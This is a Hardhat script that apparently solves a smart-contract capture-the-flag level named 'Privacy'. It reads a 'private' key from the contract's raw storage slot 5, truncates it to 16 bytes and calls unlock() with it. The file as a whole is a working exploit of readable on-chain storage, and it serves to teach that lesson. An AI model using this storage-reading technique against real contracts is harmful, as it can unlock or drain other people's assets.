const { ethers } = require("hardhat");

const PRIVACY_CONTRACT_NAME = "Privacy";
const PRIVACY_CONTRACT_ADDRESS = "0x6AffcB025A2E069C0Ebbf53982BCDAEe4ef40BE3";

async function main() {
    /**
     * | Slot 0 | bool locked |
     * | Slot 1 | uint256 ID |
     * | Slot 2 | uint8 flattening + unit8 denomination + uint16 awkwardness |
     * | Slot 3 | bytes32 data[0] |
     * | Slot 4 | bytes32 data[1] |
     * | Slot 5 | bytes32 data[2] | --> we are interested in this storage slot to unlock
     */
    const dataArraySlot = 5;
    const key32 = await ethers.provider.getStorage(PRIVACY_CONTRACT_ADDRESS, dataArraySlot);
    const key16 = key32.slice(0, 16 * 2 + 2);

    const privacyFactory = await ethers.getContractFactory(PRIVACY_CONTRACT_NAME);
    const privacyContract = privacyFactory.attach(PRIVACY_CONTRACT_ADDRESS);

    const tx = await privacyContract.unlock(key16);
    tx.wait();
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})